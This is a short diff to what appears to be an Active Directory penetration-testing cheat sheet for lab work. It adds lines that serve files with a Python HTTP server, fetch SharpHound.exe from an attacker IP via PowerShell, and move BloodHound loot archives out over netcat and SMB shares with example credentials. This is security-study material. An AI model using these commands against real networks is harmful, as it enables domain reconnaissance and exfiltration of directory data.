@@ -254,6 +254,9 @@ copy gMSADumper.py \\192.168.49.124\share\
 copy SharpHound.ps1 \\192.168.49.124\share\
 copy PowerView.ps1 \\192.168.49.124\share\
 
+python3 -m http.server 80
+powershell wget 192.168.49.124/SharpHound.exe -O SharpHound.exe
+
 
 ===================================
 Quick-Roast (requires creds)
@@ -369,6 +372,10 @@ smbserver.py share . -smb2support -username mike -password helps
 net use \\192.168.162.46\share /u:mike helps 
 copy 20220118140920_BloodHound.zip \\192.168.162.46\share\  
 net use /d \\192.168.162.46\share 
+nc -nvlp 9999 < 123456_BloodHound.zip
+nc 192.168.200.5 9999 > Sharphound.zip
+sudo neo4j start
+bloodhound
 
 Remote Bloodhound (needs creds)
 bloodhound.py -c All,LoggedOn -u "bob" -p "paxx" -d mike.com -ns 192.168.200.5
